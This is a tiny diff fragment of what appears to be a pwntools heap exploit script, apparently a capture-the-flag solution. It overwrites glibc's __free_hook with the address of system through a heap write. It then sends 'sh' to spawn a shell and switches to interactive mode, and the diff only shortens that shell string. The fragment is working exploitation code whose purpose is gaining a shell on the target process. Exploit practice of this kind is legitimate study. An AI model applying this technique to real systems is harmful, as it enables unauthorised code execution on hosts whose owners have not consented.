@@ -84,5 +84,5 @@ libc_elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 write_u64_heap(libc_base - heap_base + libc_elf.symbols['__free_hook'],
         libc_base + libc_elf.symbols.system)
 
-p.sendline("/bin/sh")
+p.sendline("sh")
 p.interactive()
